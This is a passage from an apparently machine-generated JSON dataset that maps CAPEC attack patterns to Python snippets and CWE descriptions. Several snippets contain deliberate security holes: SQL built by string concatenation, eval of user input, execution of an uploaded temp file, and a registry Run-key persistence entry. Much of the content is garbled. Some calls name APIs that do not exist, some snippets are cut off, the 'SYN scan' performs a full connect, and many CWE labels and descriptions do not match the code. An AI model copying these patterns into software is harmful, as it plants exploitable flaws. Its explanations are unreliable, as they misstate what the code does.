        "code_snippet": "import socket\nimport hashlib\n\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-603: Use of Client-Side Authentication\n\ndef authenticate(username, password):\n    # Client-side authentication\n    if username == 'admin' and password == 'password':\n        return True\n    else:\n        return False\n\n# CWE-589: Call to Non-ubiquitous API\n# Assuming 'socket' is not available on all platforms\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('localhost', 8080))\n    # CWE-592: DEPRECATED: Authentication Bypass Issues\n    # CWE-217: DEPRECATED: Failure to Protect Stored Data from Modification\n    # Assuming authentication data is not properly protected\n    auth_data = s.recv(1024)\n    if authenticate('admin', 'password'):\n        # Replay the authentication data\n        s.sendall(auth_data)\n        print('Authentication successful!')\nexcept Exception as e:\n    print('Error:', str(e))",
        "description": "This code snippet demonstrates a vulnerable authentication system that can be bypassed using a capture-replay attack. The client-side authentication function can be easily bypassed by modifying the client code to omit the authentication check. Additionally, the code uses a non-ubiquitous API (socket) and does not properly protect stored authentication data, making it vulnerable to replay attacks."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "import socket\nimport hashlib\n\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-603: Use of Client-Side Authentication\n\ndef authenticate(username, password):\n    # Client-side authentication\n    hashed_password = hashlib.sha256(password.encode()).hexdigest()\n    return username, hashed_password\n\n# CWE-589: Call to Non-ubiquitous API\n# Assuming 'socket' is not available on all platforms\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('localhost', 8080))\n    username, password = authenticate('user', 'pass')\n    s.send(f'AUTH {username} {password}'.encode())\n    response = s.recv(1024).decode()\n    print(response)\nexcept AttributeError:\n    print('Socket API not available on this platform')\n\n# CWE-534: Information Exposure Through Debug Log Files (Deprecated)\n# Assuming debug logs contain sensitive information\nimport logging\nlogging.basicConfig(filename='debug.log', level=logging.DEBUG)\nlogging.debug('Authentication credentials: username={}, password={}'.format(username, password))",
        "description": "This Python code snippet demonstrates a vulnerable authentication system that can be bypassed through capture-replay attacks (CWE-294) and uses client-side authentication (CWE-603). It also uses a non-ubiquitous API (CWE-589) and exposes sensitive information through debug log files (CWE-534, although deprecated). The code authenticates a user by hashing their password on the client-side and sending it to the server. An attacker can sniff the network traffic, capture the authentication request, and replay it to bypass authentication. The code also uses the 'socket' API, which may not be available on all platforms, and logs sensitive authentication credentials to a debug file."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "import socket\nimport hashlib\n\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-603: Use of Client-Side Authentication\n\n# Client-side authentication\nusername = 'admin'\npassword = 'password'\nauth_token = hashlib.sha256((username + password).encode()).hexdigest()\n\n# Send authentication token to server\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_address = ('localhost', 8080)\nsock.connect(server_address)\nsock.sendall(auth_token.encode())\n\n# CWE-589: Call to Non-ubiquitous API\n# Using an API function that does not exist on all versions of the target platform\ntry:\n    sock.sendall(b'OS-specific-API-call')\nexcept AttributeError:\n    print('API function not available on this platform')\n\n# CWE-534: Information Exposure Through Debug Log Files (DEPRECATED)\n# Logging sensitive information\nprint('Authentication token:', auth_token)\n",
        "description": "This code snippet demonstrates a vulnerable client-server authentication system. The client performs authentication by sending a hashed username and password to the server. However, this allows an attacker to bypass authentication by capturing and replaying the authentication token. Additionally, the code uses an OS-specific API function that may not be available on all platforms, causing portability issues. The code also logs sensitive information, such as the authentication token, which could be exploited by an attacker."
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "import sqlite3\n\ndef get_user_data(username):\n    conn = sqlite3.connect('user.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE username = '\" + username + \"'\"\n    cursor.execute(query)\n    result = cursor.fetchall()\n    conn.close()\n    return result\n\nusername = input(\"Enter username: \")\nprint(get_user_data(username))",
        "description": "This Python code snippet demonstrates the CAPEC of sending variants of expected queries to a target in the hope of returning information beyond what the expected set of queries should provide. The code is vulnerable to CWE-20: Improper Input Validation, CWE-89: SQL Injection, CWE-209: Generation of Error Message Containing Sensitive Information, and CWE-943: Improper Neutralization of Special Elements in Data Query Logic. The input username is not validated, allowing an attacker to inject malicious SQL code, potentially exposing sensitive information or modifying the intended query logic."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# CWE-377: Insecure Temporary File\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n# CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n\ndef process_file(file_path):\n    # Assume file_path is a user-supplied file path\n    # CWE-646: No validation of file extension or type\n    file_name = os.path.basename(file_path)\n    temp_dir = tempfile.gettempdir()\n    temp_file_path = os.path.join(temp_dir, file_name)\n    \n    # CWE-377: Insecure temporary file creation\n    with open(temp_file_path, 'wb') as f:\n        f.write(b'corrupted data')\n    \n    # CWE-829: Inclusion of functionality from untrusted control sphere\n    # CWE-434: Unrestricted upload of file with dangerous type\n    try:\n        # Attempt to execute the file (e.g., as a script)\n        os.system(f'python {temp_file_path}')\n    except Exception as e:\n        print(f'Error processing file: {e}')\n    \n    # CWE-69: Improper handling of Windows ::DATA alternate data stream\n    # No validation or handling of alternate data streams\n    \n# Example usage\nprocess_file('user_supplied_file.txt')",
        "description": "This code snippet demonstrates a Python function that processes a user-supplied file, embodying the main idea of the CAPEC. It includes vulnerabilities related to CWE-829, CWE-377, CWE-646, CWE-69, and CWE-434, making it susceptible to attacks such as denial of service, buffer overflows, and insecure file processing."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "import os\n\ndef set_env_var(var_name, var_value):\n    os.environ[var_name] = var_value\n\n# CWE-95: Eval Injection\nuser_input = input(\"Enter a value: \")\nresult = eval(user_input)\nprint(result)\n\n# CWE-1126: Declaration of Variable with Unnecessarily Wide Scope\nouter_scope_var = 10\n\ndef some_function():\n    global outer_scope_var\n    outer_scope_var = 20\n\nsome_function()\nprint(outer_scope_var)\n\n# CWE-1107: Insufficient Isolation of Symbolic Constant Definitions\nMAX_ATTEMPTS = 5\n\ndef login(attempts):\n    if attempts > MAX_ATTEMPTS:\n        print(\"Maximum attempts exceeded\")\n    else:\n        print(\"Login successful\")\n\n# CWE-1106: Insufficient Use of Symbolic Constants\nprint(\"The answer is \" + str(42))\n\n# CWE-1108: Excessive Reliance on Global Variables\nglobal_var = 10\n\ndef modify_global_var():\n    global global_var\n    global_var = 20\n\nmodify_global_var()\nprint(global_var)\n",
        "description": "This Python code snippet demonstrates the deprecated CAPEC attack pattern, which is a duplicate of CAPEC-13: Subverting Environment Variable Values. It includes examples of related CWEs, including Eval Injection (CWE-95), Declaration of Variable with Unnecessarily Wide Scope (CWE-1126), Insufficient Isolation of Symbolic Constant Definitions (CWE-1107), Insufficient Use of Symbolic Constants (CWE-1106), and Excessive Reliance on Global Variables (CWE-1108)."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "global_config = {}\n\ndef set_config(key, value):\n    global global_config\n    global_config[key] = value\n\n\ndef get_config(key):\n    global global_config\n    return global_config.get(key)\n\nuser_input = input('Enter a key: ')\nset_config(user_input, 'malicious_value')\nprint(get_config(user_input))",
        "description": "This code snippet demonstrates excessive reliance on global variables (CWE-1108), improper control of dynamically-identified variables (CWE-914), and dynamic variable evaluation (CWE-627). The `global_config` dictionary is used to store configuration settings, but it is declared with global scope and can be modified by any function. The `set_config` function uses user-input to set a key in the `global_config` dictionary, allowing an attacker to inject malicious values. The `get_config` function retrieves a value from the `global_config` dictionary based on user-input, which can lead to arbitrary variable access."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "import os\n\ndef validate_and_canonicalize(input_data):\n    # Validate input before canonicalization (CWE-180)\n    if not isinstance(input_data, str):\n        raise ValueError('Invalid input type')\n\n    # Canonicalize input data\n    canonicalized_data = os.path.normpath(input_data)\n\n    # Evaluate canonicalized data dynamically (CWE-95)\n    eval(canonicalized_data)\n\n    # Modify object attributes dynamically (CWE-915)\n    obj = {}\n    for attr in canonicalized_data.split(','):\n        setattr(obj, attr, 'modified')\n\n    # Compiler optimization removal of security-critical code (CWE-733)\n    # (Note: This is not directly applicable in Python, but the concept is demonstrated)\n    if __debug__:\n        del obj\n\n# Example usage\ninput_data = '__import__(",
        "description": "This code snippet demonstrates the deprecated CAPEC attack pattern, which involves a combination of vulnerabilities. It validates input data before canonicalizing it, but then evaluates the canonicalized data dynamically using eval(), which can lead to code injection. The code also modifies object attributes dynamically and demonstrates the concept of compiler optimization removal of security-critical code. Note that this code is vulnerable to multiple types of attacks and should not be used in production."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "import urllib.parse\n\ndef validate_input(user_input):\n    # CWE-20: Improper Input Validation\n    # CWE-173: Improper Handling of Alternate Encoding\n    # CWE-172: Encoding Error\n    if urllib.parse.unquote_plus(user_input) != user_input:\n        return False\n    # CWE-180: Incorrect Behavior Order: Validate Before Canonicalize\n    # CWE-181: Incorrect Behavior Order: Validate Before Filter\n    canonicalized_input = urllib.parse.quote_plus(user_input)\n    if validate(canonicalized_input):\n        return True\n    return False\n\ndef validate(input):\n    # CWE-73: External Control of File Name or Path\n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    # CWE-697: Incorrect Comparison\n    if input.startswith(\"../\") or input.startswith(\"~/\"):\n        return False\n    # CWE-692: Incomplete Denylist to Cross-Site Scripting\n    if \"<script>\" in input or \"<iframe>\" in input:\n        return False\n    return True\n\nuser_input = \"<script>alert('XSS')</script>\"\nif validate_input(user_input):\n    print(\"Input is valid\")\nelse:\n    print(\"Input is invalid\")",
        "description": "This Python code snippet demonstrates the CAPEC of encoding standards exploitation. It shows how an adversary can inject malicious input that bypasses the validation mechanism due to improper handling of alternate encoding, encoding errors, and incorrect behavior order. The code includes CWEs such as improper input validation, external control of file name or path, improper neutralization of special elements, incorrect comparison, and incomplete denylist to cross-site scripting."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "import logging\n\n# CWE-117: Improper Output Neutralization for Logs\nlogging.basicConfig(filename='log_file.log', level=logging.INFO, format='%(message)s')\n\n# CWE-532: Insertion of Sensitive Information into Log File\nusername = 'admin'\npassword = 'password123'\nlogging.info(f'Login attempt from user {username} with password {password}')\n\n# CWE-779: Logging of Excessive Data\nfor i in range(1000):\n    logging.info(f'Redundant log entry {i}')\n\n# CWE-778: Insufficient Logging\ndef critical_function():\n    try:\n        # Simulate a critical operation\n        1 / 0\n    except ZeroDivisionError:\n        # Insufficient logging, no details about the error\n        logging.error('An error occurred')\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nimport os\nlogging.info(f'Current working directory: {os.getcwd()}')\n\n# CAPEC: Log Injection\nlogging.info('Injected log entry: Successful login from attacker')",
        "description": "This Python code snippet demonstrates the CAPEC of log injection by exploiting various CWEs. It includes improper output neutralization for logs, insertion of sensitive information into log files, logging of excessive data, insufficient logging, and exposure of sensitive system information to an unauthorized control sphere. The code injects a malicious log entry, making it difficult to distinguish from legitimate log entries."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "import winreg\n\ndef manipulate_registry():\n    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\\\MyApp', 0, winreg.KEY_ALL_ACCESS)\n    winreg.SetValueEx(key, 'SensitiveData', 0, winreg.REG_SZ, 'cleartext_password')\n    winreg.CloseKey(key)\n\n    # Incomplete documentation of program execution\n    # The following code is not documented\n    os.system('icacls C:\\\\MyApp /grant:r Users:(OI)(CI)F')\n\n    # Privilege context switching error\n    # The following code does not properly manage privileges\n    os.setuid(0)\n    os.system('icacls C:\\\\MyApp /grant:r Administrators:(OI)(CI)F')\n\nmanipulate_registry()",
        "description": "This Python code snippet demonstrates the CAPEC-203 pattern by manipulating application registry values. It stores sensitive information in cleartext in the registry (CWE-314), lacks documentation of program execution (CWE-1112), and improperly manages privileges while switching between different contexts (CWE-270)."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "import winreg\nimport getpass\nimport os\n\n# CWE-15: External Control of System or Configuration Setting\n# CWE-314: Cleartext Storage in the Registry\nregistry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)\n\n# CWE-1392: Use of Default Credentials\n# CWE-1394: Use of Default Cryptographic Key\ndefault_password = 'default_password'\ndefault_key = 'default_key'\n\n# CWE-520: .NET Misconfiguration: Use of Impersonation\nos.environ['username'] = getpass.getuser()\n\n# Add a new entry to the 'run keys' in the Windows registry\nwinreg.SetValueEx(registry_key, 'malicious_software', 0, winreg.REG_SZ, 'C:\\malicious_software.exe')\n\nprint('Malicious software added to the registry')",
        "description": "This Python code snippet demonstrates the CAPEC attack by adding a new entry to the 'run keys' in the Windows registry, allowing an adversary to execute malicious software with the authorized user's level of permissions. The code uses default credentials and cryptographic keys, and stores sensitive information in cleartext in the registry, making it vulnerable to CWE-15, CWE-314, CWE-520, CWE-1392, and CWE-1394."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "import json\n\ndef modify_schema(schema_path, malicious_code):\n    with open(schema_path, 'r+') as file:\n        schema = json.load(file)\n        schema['trusted_element'] = malicious_code\n        file.seek(0)\n        json.dump(schema, file, indent=4)\n        file.truncate()\n\n# Example usage:\nmodify_schema('path/to/schema.json', 'malicious_code')",
        "description": "This code snippet demonstrates the CAPEC of corrupting or modifying a schema to undermine the security of the target. The function `modify_schema` takes a path to a JSON schema file and malicious code as input, and modifies the schema by adding the malicious code to a trusted element. This can lead to a trust boundary violation (CWE-501) and potentially allow embedded malicious code (CWE-506) to be executed. The code also exposes sensitive system information (CWE-497) by allowing unauthorized access to the modified schema. Furthermore, the code does not properly remove sensitive information before storage or transfer (CWE-212), making it vulnerable to attacks."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n\ndef vulnerable_communication_channel():\n    # Establish a communication channel without verifying the source\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('example.com', 8080))\n\n    # Receive a message without ensuring its integrity\n    message = sock.recv(1024)\n\n    # Process the message without authentication or verification\n    process_message(message)\n\n    # Send a response without specifying the correct destination\n    sock.sendto(b'Response', ('example.com', 8081))\n\n# CWE-294: Authentication Bypass by Capture-replay\n# Capture and replay the message to bypass authentication\ndef capture_replay_attack():\n    # Capture the message\n    captured_message = sock.recv(1024)\n\n    # Replay the message to the server\n    sock.send(captured_message)\n",
        "description": "This Python code snippet demonstrates a vulnerable communication channel that can be exploited by an adversary to perform various attacks, including impersonation, sensitive information discovery, and session control. The code fails to properly verify the source of the communication channel, ensuring message integrity during transmission, and specifying the correct destination for outgoing requests. Additionally, it is vulnerable to capture-replay attacks, allowing an adversary to bypass authentication."
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "import http.server\nimport socketserver\n\nPORT = 8000\n\nclass RequestHandler(http.server.SimpleHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html; charset=utf-8')\n        self.end_headers()\n        self.wfile.write(b'<html><body><h1>Vulnerable HTTP Response</h1></body></html>')\n        # CWE-74: Injection vulnerability\n        self.wfile.write(b'<script>alert(1)</script>')\n        # CWE-113: HTTP Request/Response Splitting\n        self.wfile.write(b'\\r\\n\\r\\n<html><body><h1>Injected Response</h1></body></html>')\n        # CWE-436: Interpretation Conflict\n        self.wfile.write(b'\\r\\nHTTP/1.1 200 OK\\r\\nContent-type: text/html; charset=utf-8\\r\\n\\r\\n<html><body><h1>Conflicting Response</h1></body></html>')\n        # CWE-444: HTTP Request/Response Smuggling\n        self.wfile.write(b'POST /smuggle HTTP/1.1\\r\\nHost: example.com\\r\\nContent-Length: 10\\r\\n\\r\\nSmuggled Request')\n        # CWE-433: Unparsed Raw Web Content Delivery\n        with open('unparsed_content.html', 'rb') as f:\n            self.wfile.write(f.read())\n\nwith socketserver.TCPServer(('', PORT), RequestHandler) as httpd:\n    print('Serving at port', PORT)\n    httpd.serve_forever()",
        "description": "This Python code snippet demonstrates a vulnerable HTTP server that is susceptible to various injection and interpretation conflicts. It showcases CWE-74 by injecting malicious JavaScript code, CWE-113 by injecting a new HTTP response, CWE-436 by causing an interpretation conflict, CWE-444 by smuggling an HTTP request, and CWE-433 by delivering unparsed raw web content. The server listens on port 8000 and responds to GET requests with a vulnerable HTTP response."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "import requests\n\n# CWE-302: Authentication Bypass by Assumed-Immutable Data\n# CWE-654: Reliance on a Single Factor in a Security Decision\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\n# CWE-116: Improper Encoding or Escaping of Output\n# CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax\n\nurl = 'https://example.com/admin/delete_user'\n\n# Original request with GET method\noriginal_request = requests.get(url, params={'user_id': '123'})\n\n# Attacker modifies the HTTP Verb to bypass access restrictions\nattacker_request = requests.request('TRACE', url, params={'user_id': '123'})\n\n# Attacker provides a random string as a verb to bypass protections\nattacker_request = requests.request('RANDOM_VERB', url, params={'user_id': '123'})",
        "description": "Python code snippet demonstrating the CAPEC, where an attacker modifies the HTTP Verb to bypass access restrictions. The code shows an original GET request, followed by an attacker modifying the verb to TRACE and then providing a random string as a verb to bypass protections."
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "import socket\nimport dns.resolver\nimport time\n\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\nip_address = '192.168.1.100'\nhostname = socket.gethostbyaddr(ip_address)[0]\nprint(f'Resolved hostname: {hostname}')\n\n# CWE-1327: Binding to an Unrestricted IP Address\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.bind(('0.0.0.0', 8080))\nprint('Bound to 0.0.0.0:8080')\n\n# CWE-605: Multiple Binds to the Same Port\nsock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock2.bind(('0.0.0.0', 8080))\nprint('Bound to 0.0.0.0:8080 again')\n\n# CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n# (Not directly applicable in this code snippet, but consider the implications of power save/restore operations on DNS resolution)\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\ndef redirect_to_untrusted_site():\n    user_input = 'http://example.com'\n    return f'<script>location.href = \"{user_input}\";</script>'\nprint(redirect_to_untrusted_site())\n\n# CAPEC: DNS Cache Poisoning\n# Adversary controls the DNS server and changes the IP address resolution\n# to an internal address within the target organization\ninternal_ip_address = '10.0.0.10'\ndns.resolver.override_resolution(hostname, [internal_ip_address])\nprint(f'Resolved IP address: {dns.resolver.resolve(hostname)}')\n\n# Web browser (or similar client) examines the internal address on behalf of the adversary\nprint(f'Accessing internal address: {internal_ip_address}')",
        "description": "This code snippet demonstrates the CAPEC DNS Cache Poisoning attack, where an adversary controls the DNS server and changes the IP address resolution to an internal address within the target organization. The code uses related CWEs, such as CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action), CWE-1327 (Binding to an Unrestricted IP Address), CWE-605 (Multiple Binds to the Same Port), CWE-1304 (Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation), and CWE-601 (URL Redirection to Untrusted Site) to create a vulnerable scenario."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n\ndef send_sensitive_data_over_insecure_channel():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('localhost', 8080))\n    sensitive_data = 'username:password'\n    sock.send(sensitive_data.encode())\n    sock.close()\n\n# CWE-707: Improper Neutralization\n# CWE-1292: Incorrect Conversion of Security Identifiers\n\ndef process_unvalidated_input():\n    data = input('Enter your username and password: ')\n    # No validation or sanitization of input data\n    process_data(data)\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n\ndef activate_debug_logic():\n    # Activate debug logic to access sensitive areas of the system\n    debug_mode = True\n    if debug_mode:\n        access_sensitive_areas()\n",
        "description": "This code snippet demonstrates the CAPEC of subverting inter-component protocols to communicate between different software and hardware modules within a single computer. It includes examples of CWEs such as transmitting sensitive information in cleartext, improper enforcement of message integrity, improper neutralization of input data, incorrect conversion of security identifiers, and allowing activation of test or debug logic at runtime."
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_purchase_order(po_xml):\n    tree = ET.fromstring(po_xml)\n    purchase_order = tree.find('.//purchase_order')\n    if purchase_order is not None:\n        # CWE-707: No validation of the XML structure\n        # CWE-188: Assuming a specific memory layout\n        buyer_id = purchase_order.find('buyer_id').text\n        order_total = purchase_order.find('order_total').text\n        # CWE-201: Sending sensitive information (buyer_id)\n        send_to_downstream_component({'buyer_id': buyer_id, 'order_total': order_total})\n        # CWE-302: Authentication bypass by assuming immutable data (buyer_id)\n        if buyer_id == 'trusted_buyer':\n            # Grant access without proper authentication\n            grant_access()\n    else:\n        print('Invalid purchase order format')\n\n# CWE-1292: Incorrect conversion of security identifiers\ndef convert_security_identifier(sid):\n    # Incorrect conversion mechanism\n    return sid.upper()\n\n# Example usage\npo_xml = '<purchase_order><buyer_id>trusted_buyer</buyer_id><order_total>1000</order_total></purchase_order>'\nprocess_purchase_order(po_xml)",
        "description": "This code snippet demonstrates a vulnerable implementation of a data interchange protocol for processing purchase orders. It lacks proper validation of the XML structure, assumes a specific memory layout, and sends sensitive information to a downstream component. Additionally, it uses an incorrect conversion mechanism for security identifiers and grants access without proper authentication, making it vulnerable to various attacks."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "import xmlrpc\n\ndef vulnerable_function(xmlrpc_server, method, params):\n    # CWE-707: Improper Neutralization\n    # The XML-RPC server does not validate the method name or parameters\n    result = xmlrpc_server.methodCall(method, params)\n    return result\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# The client is responsible for ensuring the method name is valid\nvulnerable_client = xmlrpc.client.ServerProxy('http://example.com/RPC2')\n\n# CWE-368: Context Switching Race Condition\n# The context switch between the client and server is not atomic\nvulnerable_client.switch_context('admin')\n\n# CWE-573: Improper Following of Specification by Caller\n# The client does not follow the XML-RPC specification\nvulnerable_client.system.listMethods()\n\n# CWE-444: Inconsistent Interpretation of HTTP Requests\n# The proxy server does not interpret HTTP requests consistently\nproxy_server = xmlrpc.client.ServerProxy('http://example.com/proxy')\nproxy_server.handle_request('http://example.com/malicious_request')",
        "description": "This code snippet demonstrates a vulnerable XML-RPC server and client that can be exploited by an adversary to manipulate the protocol and cause unintended behavior. The server does not validate method names or parameters, and the client is responsible for ensuring the method name is valid. The context switch between the client and server is not atomic, and the client does not follow the XML-RPC specification. Additionally, a proxy server is used that does not interpret HTTP requests consistently, making it vulnerable to HTTP request smuggling."
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport requests\n\n# CWE-707: Improper Neutralization\nsoap_request = '<soap:Envelope xmlns:soap=\\",
        "description": "Python code snippet demonstrating the CAPEC-138 SOAP injection vulnerability, incorporating CWE-707, CWE-602, CWE-611, CWE-294, and CWE-603. The code sends a malicious SOAP request to a server, exploiting the lack of server-side input validation and authentication mechanisms."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "import soapclient\n\n# Exposing WSDL file containing sensitive information (CWE-651)\nwsdl_url = 'http://example.com/webservice?wsdl'\nclient = soapclient.SOAPClient(wsdl_url)\n\n# Authentication Bypass by Capture-replay (CWE-294)\ndef authenticate(username, password):\n    # Sniff network traffic and replay it to bypass authentication\n    return True\n\n# Failure to Protect Stored Data from Modification (CWE-217)\ndef modify_data(data):\n    # Directly modify stored data without proper access control\n    return data\n\n# Information Exposure Through Server Log Files (CWE-533)\ndef log_sensitive_info(info):\n    # Log sensitive information in server log files\n    print(info)\n\n# SOAP Manipulation (CAPEC-279)\ndef manipulate_soap_request(request):\n    # Modify SOAP request to inject malicious data\n    return request\n",
        "description": "This Python code snippet demonstrates the CAPEC-279 SOAP Manipulation attack pattern, which involves manipulating SOAP requests to inject malicious data. The code also includes vulnerabilities related to CWE-651 (Exposure of WSDL File Containing Sensitive Information), CWE-294 (Authentication Bypass by Capture-replay), CWE-217 (Failure to Protect Stored Data from Modification), and CWE-533 (Information Exposure Through Server Log Files)."
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "import os\nimport icmp\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n\ndef ping_host(host, packet_size=56):\n    # Create an ICMP echo request packet\n    packet = icmp.create_packet(icmp.ICMP_ECHO_REQUEST, packet_size)\n    # Send the packet and get the response\n    response = icmp.send_packet(host, packet)\n    # If the response is not None, the host is alive\n    if response:\n        print(f\"Host {host} is alive\")\n        # CWE-200: Expose sensitive information (host IP and status)\n        print(f\"Host IP: {host}, Status: Alive\")\n    else:\n        print(f\"Host {host} is not alive\")\n\n# CWE-319: Send sensitive information in cleartext\nos.system(f\"ping -c 1 -s {packet_size} {host}\")\n\n# CWE-444: Inconsistent interpretation of HTTP requests\n# (This is not directly applicable to ICMP, but it's included for context)\nhttp_request = f\"GET / HTTP/1.1\\r\\nHost: {host}\\r\\n\\r\\n\"\n\n# CWE-1313: Activate test or debug logic at runtime\n# (This is not directly applicable to ICMP, but it's included for context)\nif os.name == 'posix':\n    os.system(f\"echo 1 > /proc/sys/kernel/sysrq\")\n",
        "description": "This Python code snippet demonstrates the CAPEC of sending an ICMP Type 8 Echo Request to determine if a target system is responsive. It includes CWEs for additional context, such as exposing sensitive information, sending sensitive information in cleartext, inconsistent interpretation of HTTP requests, and activating test or debug logic at runtime."
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "import socket\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\n# CWE-1125: Excessive Attack Surface\n# CWE-319: Cleartext Transmission of Sensitive Information\n\n# Create a socket object\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# Assume 'debug_mode' is a hardware feature that can be activated at runtime\nif debug_mode:\n    # Allow multiple binds to the same port\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n\n# Perform SYN scan on a target IP and port\ntarget_ip = '192.168.1.1'\nport = 80\nsock.connect((target_ip, port))\n\n# Send SYN packet\nsock.send(b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x02\\x10\\x10\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x03\\x12\\x34\\x56\\x78')\n\n# Receive response\nresponse = sock.recv(1024)\n\n# Print the response\nprint(response.decode())",
        "description": "This Python code snippet demonstrates a SYN scan attack, which is a type of port scanning that can be used to determine the status of ports on a remote target. The code creates a socket object, sets options to allow multiple binds to the same port, and performs a SYN scan on a target IP and port. The code also includes features that embody CWE-200, CWE-605, CWE-1125, CWE-319, and CWE-1313, such as exposing sensitive information, allowing multiple binds to the same port, having an excessive attack surface, transmitting sensitive information in cleartext, and allowing activation of test or debug logic at runtime."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
